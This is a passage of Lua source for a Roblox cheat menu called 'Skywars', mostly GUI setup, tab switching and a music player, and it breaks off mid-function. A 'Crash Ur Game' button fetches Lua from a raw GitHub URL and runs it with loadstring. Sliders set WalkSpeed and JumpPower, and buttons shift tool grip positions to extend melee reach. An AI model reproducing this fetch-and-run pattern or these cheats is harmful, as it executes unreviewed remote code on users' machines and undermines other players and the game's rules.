a.crashurgame.Size = UDim2.new(1, 0, 0, 30)
a.crashurgame.ZIndex = 2
a.crashurgame.Font = Enum.Font.SourceSansBold
a.crashurgame.Text = "Crash Ur Game ( Every Exploit Works"
a.crashurgame.TextColor3 = Color3.fromRGB(204, 204, 204)
a.crashurgame.TextScaled = true
a.crashurgame.TextSize = 14.000
a.crashurgame.TextWrapped = true
a.crashurgame.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/crashingurexploit/main/crash"))()
    end
)
a.UICorner_104.CornerRadius = UDim.new(0, 4)
a.UICorner_104.Parent = a.crashurgame
a.Frame_10.Parent = a.hom
a.Frame_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.Frame_10.Position = UDim2.new(0, 0, 0.852, 0)
a.Frame_10.Size = UDim2.new(0, 361, 0, 0)
a.circleattack.Name = "circleattack"
a.circleattack.Parent = a.hom
a.circleattack.AnchorPoint = Vector2.new(0.5, 0)
a.circleattack.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.circleattack.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.circleattack.BorderSizePixel = 2
a.circleattack.Position = UDim2.new(0.499, 0, 0.892, 0)
a.circleattack.Size = UDim2.new(1, 0, 0, 30)
a.circleattack.ZIndex = 2
a.circleattack.Font = Enum.Font.SourceSansBold
a.circleattack.Text = "Circle Attack"
a.circleattack.TextColor3 = Color3.fromRGB(204, 204, 204)
a.circleattack.TextScaled = true
a.circleattack.TextSize = 14.000
a.circleattack.TextWrapped = true
a.circleattack.MouseButton1Down:connect(
    function()
        for j, cV in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
            if cV:IsA("Tool") then
                cV.Parent = game:GetService("Players").LocalPlayer.Character
            end
        end
        for u, v in pairs(game:GetService "Players".LocalPlayer.Character:GetChildren()) do
            if v:isA("Tool") then
                v.GripPos = Vector3.new(7, 0, 3)
            end
        end
    end
)
a.UICorner_105.CornerRadius = UDim.new(0, 4)
a.UICorner_105.Parent = a.circleattack
a.normalattack.Name = "normalattack"
a.normalattack.Parent = a.hom
a.normalattack.AnchorPoint = Vector2.new(0.5, 0)
a.normalattack.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.normalattack.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.normalattack.BorderSizePixel = 2
a.normalattack.Position = UDim2.new(0.499, 0, 1.028, 0)
a.normalattack.Size = UDim2.new(1, 0, 0, 30)
a.normalattack.ZIndex = 2
a.normalattack.Font = Enum.Font.SourceSansBold
a.normalattack.Text = "Normal Attack"
a.normalattack.TextColor3 = Color3.fromRGB(204, 204, 204)
a.normalattack.TextScaled = true
a.normalattack.TextSize = 14.000
a.normalattack.TextWrapped = true
a.normalattack.MouseButton1Down:connect(
    function()
        for j, cV in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
            if cV:IsA("Tool") then
                cV.Parent = game:GetService("Players").LocalPlayer.Character
            end
        end
        for u, v in pairs(game:GetService "Players".LocalPlayer.Character:GetChildren()) do
            if v:isA("Tool") then
                v.GripPos = Vector3.new(0, 0, 0)
            end
        end
    end
)
a.UICorner_106.CornerRadius = UDim.new(0, 4)
a.UICorner_106.Parent = a.normalattack
a.OpenFrame.Name = "OpenFrame"
a.OpenFrame.Parent = a.Skywars
a.OpenFrame.Active = true
a.OpenFrame.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
a.OpenFrame.Position = UDim2.new(0, -130, 0.54400003, 0)
a.OpenFrame.Size = UDim2.new(0, 120, 0, 50)
a.UICorner_107.CornerRadius = UDim.new(0.0299999993, 0)
a.UICorner_107.Parent = a.OpenFrame
a.Open.Name = "Open"
a.Open.Parent = a.OpenFrame
a.Open.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
a.Open.Size = UDim2.new(0, 120, 0, 46)
a.Open.Font = Enum.Font.GothamBold
a.Open.Text = "Open"
a.Open.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Open.TextSize = 22.000
a.Open.TextWrapped = true
a.UICorner_108.CornerRadius = UDim.new(0, 3)
a.UICorner_108.Parent = a.Open
a.ButtonSound.SoundId = "rbxassetid://2499155192"
a.ButtonSound.Volume = 1
a.ButtonSound.Name = "BTTSound"
a.ButtonSound.Parent = v
for u, v in pairs(a.Skywars:GetDescendants()) do
    if v:IsA("TextButton") then
        CreateButtonSoundClone = a.ButtonSound:Clone()
        CreateButtonSoundClone.Parent = v
        v.MouseButton1Click:Connect(
            function()
                CreateButtonSoundClone:Play()
            end
        )
    end
end
for u = 1, 10 do
    a.shadow.ImageTransparency = 1 - u / 10
    a.main.BackgroundTransparency = 1 - u / 10
    wait()
end
for u = 1, 10 do
    a.hubicon.ImageTransparency = 1 - u / 10
    wait()
end
for u = 1, 10 do
    a.hubicon.ImageTransparency = u / 10
    wait()
end
wait(0.1)
a.main:TweenPosition(UDim2.new(0, 402, 0, 81), "Out", "Elastic", 1)
local cW = a.main:TweenSize(UDim2.new(0, 126, 1.089, -38), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 1, true)
wait(0.5)
a.main:TweenPosition(UDim2.new(0, 402, 0, 81), "Out", "Sine", 1)
a.specialthings.Visible = true
local cX = a.main:TweenSize(UDim2.new(0, 511, 0, 428), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 1, true)
wait(1)
a.tabsframe.Visible = true
a.tabsframe:TweenPosition(UDim2.new(0, 0, 0, 38), "Out", "Linear", 1)
local cY = a.tabsframe:TweenSize(UDim2.new(0, 126, 1, -38), Enum.EasingDirection.Out, Enum.EasingStyle.Elastic, 1, true)
wait(0.5)
a.specialthings:TweenPosition(UDim2.new(0, 0, 0, 0))
local cZ = a.specialthings:TweenSize(UDim2.new(1, 0, 0, 38), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 1, true)
wait(0.1)
a.tabs_container:TweenPosition(UDim2.new(0, 0, 0, 0))
local c_ =
    a.tabs_container:TweenSize(UDim2.new(0, 126, 1.097, -38), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 1, true)
wait(0.9)
a.tabs_container.Visible = true
a.Close.Visible = true
a.Close:TweenPosition(UDim2.new(0.9, 0, 0.167, 0))
local c_ = a.Close:TweenSize(UDim2.new(0, 20, 0, 20), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 1, true)
a.Exit.Visible = true
a.Exit:TweenPosition(UDim2.new(0.95, 0, 0.167, 0))
local c_ = a.Exit:TweenSize(UDim2.new(0, 20, 0, 20), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 1, true)
local function d0()
    local d1 = Instance.new("LocalScript", a.JumpPower)
    local b = game:GetService("UserInputService")
    local d2 = false
    d1.Parent.mdifier.MouseButton1Down:Connect(
        function()
            d2 = true
        end
    )
    b.InputChanged:Connect(
        function()
            if d2 then
                local d3 = b:GetMouseLocation() + Vector2.new(0, 36)
                local d4 = d3 - d1.Parent.AbsolutePosition
                local d5 = math.clamp(d4.X / d1.Parent.AbsoluteSize.X, 0, 1)
                d1.Parent.mdifier.Position = UDim2.new(d5, 0, 0.5, 0)
                d1.Parent.FOVValue.Text = d5 * 150
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = d5 * 150
            end
        end
    )
    b.InputEnded:Connect(
        function(d6)
            if d6.UserInputType == Enum.UserInputType.MouseButton1 then
                d2 = false
            end
        end
    )
end
coroutine.wrap(d0)()
local function d7()
    local d1 = Instance.new("LocalScript", a.SpeedGui)
    local b = game:GetService("UserInputService")
    local d2 = false
    d1.Parent.mdifier.MouseButton1Down:Connect(
        function()
            d2 = true
        end
    )
    b.InputChanged:Connect(
        function()
            if d2 then
                local d3 = b:GetMouseLocation() + Vector2.new(0, 36)
                local d4 = d3 - d1.Parent.AbsolutePosition
                local d5 = math.clamp(d4.X / d1.Parent.AbsoluteSize.X, 0, 1)
                d1.Parent.mdifier.Position = UDim2.new(d5, 0, 0.5, 0)
                d1.Parent.FOVValue.Text = d5 * 200
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = d5 * 200
            end
        end
    )
    b.InputEnded:Connect(
        function(d6)
            if d6.UserInputType == Enum.UserInputType.MouseButton1 then
                d2 = false
            end
        end
    )
end
coroutine.wrap(d7)()
local function d8()
    local d1 = Instance.new("LocalScript", a.main)
    local d9 = game:GetService("UserInputService")
    function dragify(a9)
        dragToggle = nil
        dragSpeed = 0.15
        dragInput = nil
        dragStart = nil
        dragPos = nil
        function updateInput(d6)
            Delta = d6.Position - dragStart
            Position =
                UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
            game:GetService("TweenService"):Create(a9, TweenInfo.new(0.15), {Position = Position}):Play()
        end
        a9.InputBegan:Connect(
            function(d6)
                if
                    (d6.UserInputType == Enum.UserInputType.MouseButton1 or d6.UserInputType == Enum.UserInputType.Touch) and
                        d9:GetFocusedTextBox() == nil
                 then
                    dragToggle = true
                    dragStart = d6.Position
                    startPos = a9.Position
                    d6.Changed:Connect(
                        function()
                            if d6.UserInputState == Enum.UserInputState.End then
                                dragToggle = false
                            end
                        end
                    )
                end
            end
        )
        a9.InputChanged:Connect(
            function(d6)
                if d6.UserInputType == Enum.UserInputType.MouseMovement or d6.UserInputType == Enum.UserInputType.Touch then
                    dragInput = d6
                end
            end
        )
        game:GetService("UserInputService").InputChanged:Connect(
            function(d6)
                if d6 == dragInput and dragToggle then
                    updateInput(d6)
                end
            end
        )
    end
    dragify(d1.Parent)
end
coroutine.wrap(d8)()
local k = game:GetService("Players")
local da = k.LocalPlayer
local db = da.UserId
local dc = Enum.ThumbnailType.HeadShot
local dd = Enum.ThumbnailSize.Size420x420
local de, df = k:GetUserThumbnailAsync(db, dc, dd)
local dg = a.ProfilePhoto
dg.Image = de
dg.Size = UDim2.new(0, 34, 0, 32)
if game.Players.LocalPlayer.UserId == 1988191006 or game.Players.LocalPlayer.UserId == 1535827133 then
    a.Rank.Text = "Owner!"
    a.Rank.TextColor3 = Color3.new(1, 1, 0)
end
if game.Players.LocalPlayer.UserId == 1598687225 then
    a.Rank.Text = "Admin!"
    a.Rank.TextColor3 = Color3.new(1, 0.333333, 0)
end
if
    game.Players.LocalPlayer.UserId == not 1988191006 or game.Players.LocalPlayer.UserId == not 1535827133 or
        game.Players.LocalPlayer.UserId == not 1598687225
 then
    a.Rank.Text = "Free User!"
    a.Rank.TextColor3 = Color3.new(0.333333, 1, 0)
end
a.dplayname.Text = game.Players.LocalPlayer.DisplayName
a.plesid.Text = game.PlaceId
a.jobid.Text = game.JobId
a.uresid.Text = game.Players.LocalPlayer.UserId
a.name.Text = game.Players.LocalPlayer.Name
a.Play.MouseButton1Down:connect(
    function()
        local dh = Instance.new("TextLabel")
        dh.Parent = a.Play
        dh.BackgroundColor3 = Color3.new(0.145098, 0.145098, 0.145098)
        dh.BackgroundTransparency = 0.7
        dh.Position = UDim2.new(0, 0, 0, 0)
        dh.Text = ""
        dh.Size = UDim2.new(0, 25, 0, 30)
        wait(0.1)
        dh:TweenSize(UDim2.new(0, 345, 0, 30))
        wait(1)
        dh:Destroy()
    end
)
a.Play.MouseButton1Down:connect(
    function()
        game.Workspace.KoolMusic:Destroy()
    end
)
a.Stop.MouseButton1Down:connect(
    function()
        local dh = Instance.new("TextLabel")
        dh.Parent = a.Stop
        dh.BackgroundColor3 = Color3.new(0.145098, 0.145098, 0.145098)
        dh.BackgroundTransparency = 0.7
        dh.Position = UDim2.new(0, 0, 0, 0)
        dh.Text = ""
        dh.Size = UDim2.new(0, 25, 0, 30)
        wait(0.1)
        dh:TweenSize(UDim2.new(0, 345, 0, 30))
        wait(1)
        dh:Destroy()
    end
)
a.Play.MouseButton1Down:connect(
    function()
        wait(0.001)
        local di = Instance.new("Sound", game.Workspace)
        di.Name = "KoolMusic"
        di.Volume = 1
        di.Looped = true
        di.SoundId = "rbxassetid://" .. a.MusicIDHer.Text
        di.Parent = game.Workspace
        di.PlayOnRemove = false
        di:Play()
    end
)
a.Stop.MouseButton1Down:connect(
    function()
        local dj = game.Workspace.KoolMusic
        dj:Stop()
        wait(0.1)
        dj:Destroy()
    end
)
a.BloodPOP.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "6371179964"
    end
)
a.FashionWeek.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "2752588682"
    end
)
a.MyOrdinaryLife.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "1199443456"
    end
)
a.Rockabye.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "2179405238"
    end
)
a.Temperature.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "758186003"
    end
)
a.caka9core.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "5507097384"
    end
)
a.cantholdus.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "412756050"
    end
)
a.deadtome.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "381365062"
    end
)
a.idfc.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "279812704"
    end
)
a.shrek.MouseButton1Down:connect(
    function()
        a.MusicIDHer.Text = "152828706"
    end
)
a.CreditsFrame.ScrollBarImageColor3 = Color3.new(0.054902, 0.054902, 0.054902)
a.FeScriptsFrame.ScrollBarImageColor3 = Color3.new(0.054902, 0.054902, 0.054902)
a.HUBSandGUIS.ScrollBarImageColor3 = Color3.new(0.054902, 0.054902, 0.054902)
a.HomeFrame.ScrollBarImageColor3 = Color3.new(0.054902, 0.054902, 0.054902)
a.MusicPlayerFrame.ScrollBarImageColor3 = Color3.new(0.054902, 0.054902, 0.054902)
a.ProfileFrame.ScrollBarImageColor3 = Color3.new(0.054902, 0.054902, 0.054902)
a.ScriptsFrame.ScrollBarImageColor3 = Color3.new(0.054902, 0.054902, 0.054902)
a.TeleportsFrame.ScrollBarImageColor3 = Color3.new(0.054902, 0.054902, 0.054902)
a.CreditsButton.MouseButton1Down:Connect(
    function()
        a.creditstitle.TextColor3 = Color3.new(1, 1, 1)
        a.creditsicon.ImageColor3 = Color3.new(1, 1, 1)
        a.fescriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hometitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.homeicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubtitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayertitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayericon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profiletitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profileicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.FeScriptsFrame.Visible = false
        a.HomeFrame.Visible = false
        a.HUBSandGUIS.Visible = false
        a.MusicPlayerFrame.Visible = false
        a.ProfileFrame.Visible = false
        a.ScriptsFrame.Visible = false
        a.CreditsFrame.Visible = true
        a.TeleportsFrame.Visible = false
    end
)
a.FeScriptsButton.MouseButton1Down:Connect(
    function()
        a.creditstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.creditsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptstitle.TextColor3 = Color3.new(1, 1, 1)
        a.fescriptsicon.ImageColor3 = Color3.new(1, 1, 1)
        a.hometitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.homeicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubtitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayertitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayericon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profiletitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profileicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.FeScriptsFrame.Visible = true
        a.HomeFrame.Visible = false
        a.HUBSandGUIS.Visible = false
        a.MusicPlayerFrame.Visible = false
        a.ProfileFrame.Visible = false
        a.ScriptsFrame.Visible = false
        a.CreditsFrame.Visible = false
        a.TeleportsFrame.Visible = false
    end
)
a.HomeButton.MouseButton1Down:Connect(
    function()
        a.creditstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.creditsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hometitle.TextColor3 = Color3.new(1, 1, 1)
        a.homeicon.ImageColor3 = Color3.new(1, 1, 1)
        a.hubtitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayertitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayericon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profiletitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profileicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.FeScriptsFrame.Visible = false
        a.HomeFrame.Visible = true
        a.HUBSandGUIS.Visible = false
        a.MusicPlayerFrame.Visible = false
        a.ProfileFrame.Visible = false
        a.ScriptsFrame.Visible = false
        a.CreditsFrame.Visible = false
        a.TeleportsFrame.Visible = false
    end
)
a.HubsButton.MouseButton1Down:Connect(
    function()
        a.creditstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.creditsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hometitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.homeicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubtitle.TextColor3 = Color3.new(1, 1, 1)
        a.hubsicon.ImageColor3 = Color3.new(1, 1, 1)
        a.musicplayertitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayericon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profiletitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profileicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.FeScriptsFrame.Visible = false
        a.HomeFrame.Visible = false
        a.HUBSandGUIS.Visible = true
        a.MusicPlayerFrame.Visible = false
        a.ProfileFrame.Visible = false
        a.ScriptsFrame.Visible = false
        a.CreditsFrame.Visible = false
        a.TeleportsFrame.Visible = false
    end
)
a.MusicPlayerButton.MouseButton1Down:Connect(
    function()
        a.creditstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.creditsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hometitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.homeicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubtitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayertitle.TextColor3 = Color3.new(1, 1, 1)
        a.musicplayericon.ImageColor3 = Color3.new(1, 1, 1)
        a.profiletitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profileicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.FeScriptsFrame.Visible = false
        a.HomeFrame.Visible = false
        a.HUBSandGUIS.Visible = false
        a.MusicPlayerFrame.Visible = true
        a.ProfileFrame.Visible = false
        a.ScriptsFrame.Visible = false
        a.CreditsFrame.Visible = false
        a.TeleportsFrame.Visible = false
    end
)
a.ProfileButton.MouseButton1Down:Connect(
    function()
        a.creditstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.creditsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hometitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.homeicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubtitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayertitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayericon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profiletitle.TextColor3 = Color3.new(1, 1, 1)
        a.profileicon.ImageColor3 = Color3.new(1, 1, 1)
        a.scriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.FeScriptsFrame.Visible = false
        a.HomeFrame.Visible = false
        a.HUBSandGUIS.Visible = false
        a.MusicPlayerFrame.Visible = false
        a.ProfileFrame.Visible = true
        a.ScriptsFrame.Visible = false
        a.CreditsFrame.Visible = false
        a.TeleportsFrame.Visible = false
    end
)
a.ScriptsButton.MouseButton1Down:Connect(
    function()
        a.creditstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.creditsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hometitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.homeicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubtitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayertitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayericon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profiletitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profileicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptstitle.TextColor3 = Color3.new(1, 1, 1)
        a.scriptsicon.ImageColor3 = Color3.new(1, 1, 1)
        a.teleportstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.FeScriptsFrame.Visible = false
        a.HomeFrame.Visible = false
        a.HUBSandGUIS.Visible = false
        a.MusicPlayerFrame.Visible = false
        a.ProfileFrame.Visible = false
        a.ScriptsFrame.Visible = true
        a.CreditsFrame.Visible = false
        a.TeleportsFrame.Visible = false
    end
)
a.TeleportsButton.MouseButton1Down:Connect(
    function()
        a.creditstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.creditsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.fescriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hometitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.homeicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubtitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.hubsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayertitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.musicplayericon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profiletitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.profileicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptstitle.TextColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.scriptsicon.ImageColor3 = Color3.new(0.639216, 0.635294, 0.647059)
        a.teleportstitle.TextColor3 = Color3.new(1, 1, 1)
        a.teleportsicon.ImageColor3 = Color3.new(1, 1, 1)
        a.FeScriptsFrame.Visible = false
        a.HomeFrame.Visible = false
        a.HUBSandGUIS.Visible = false
        a.MusicPlayerFrame.Visible = false
        a.ProfileFrame.Visible = false
        a.ScriptsFrame.Visible = false
        a.CreditsFrame.Visible = false
        a.TeleportsFrame.Visible = true
    end
)
a.Open.MouseButton1Down:Connect(
    function()
        a.OpenFrame:TweenPosition(UDim2.new(0, -130, 0.544, 0), "Out", "Elastic", 1)
        wait(1)
        a.main:TweenPosition(UDim2.new(0.3, 0, 0.177, 0), "Out", "Elastic", 1)
    end
)
a.Close.MouseButton1Down:Connect(
    function()
        a.main:TweenPosition(UDim2.new(-1, 0, 0.177, 0), "Out", "Elastic", 1)
        wait(1)
        a.OpenFrame:TweenPosition(UDim2.new(0, 0, 0.544, 0), "Out", "Elastic", 1)
    end
)
a.Exit.MouseButton1Down:Connect(
    function()
        a.CreditsFrame.Visible = false
        a.FeScriptsFrame.Visible = false
        a.HUBSandGUIS.Visible = false
        a.HomeFrame.Visible = false
        a.MusicPlayerFrame.Visible = false
        a.TeleportsFrame.Visible = false
        a.ProfileFrame.Visible = false
        a.ScriptsFrame.Visible = false
        wait(0.1)
        a.main:Destroy()
        a.OpenFrame:Destroy()
        game.Workspace.KoolMusic.Volume = 0.9
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0.8
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0.7
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0.6
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0.5
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0.4
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0.3
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0.2
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0.1
        wait(0.01)
        game.Workspace.KoolMusic.Volume = 0
        game.Workspace.KoolMusic:Destroy()
        for u, v in pairs(game.CoreGui:GetDescendants()) do
            if v.Name == "Skywars" then
                v:Destroy()
            end
        end
        wait(1)
        game.CoreGui.Skywars:Destroy()
    end
)
a.discordlink.MouseButton1Down:Connect(
    function()
        local dh = Instance.new("TextLabel")
        dh.Parent = a.discordlink
        dh.BackgroundColor3 = Color3.new(0.145098, 0.145098, 0.145098)
        dh.BackgroundTransparency = 0.7
        dh.Position = UDim2.new(0, 0, 0, 0)
        dh.Text = ""
        dh.Size = UDim2.new(0, 25, 0, 30)
        wait(0.1)
        dh:TweenSize(UDim2.new(0, 345, 0, 30))
        wait(1)
        dh:Destroy()
        setclipboard("https://discord.gg/")
    end
)
a.chopex.MouseButton1Down:Connect(
    function()
        local dh = Instance.new("TextLabel")
        dh.Parent = a.chopex
        dh.BackgroundColor3 = Color3.new(0.145098, 0.145098, 0.145098)
        dh.BackgroundTransparency = 0.7
        dh.Position = UDim2.new(0, 0, 0, 0)
        dh.Text = ""
        dh.Size = UDim2.new(0, 25, 0, 30)
        wait(0.1)
        dh:TweenSize(UDim2.new(0, 345, 0, 30))
        wait(1)
        dh:Destroy()
        setclipboard("juN#0707")
    end
)
a.uimaker.MouseButton1Down:Connect(
    function()
        local dh = Instance.new("TextLabel")
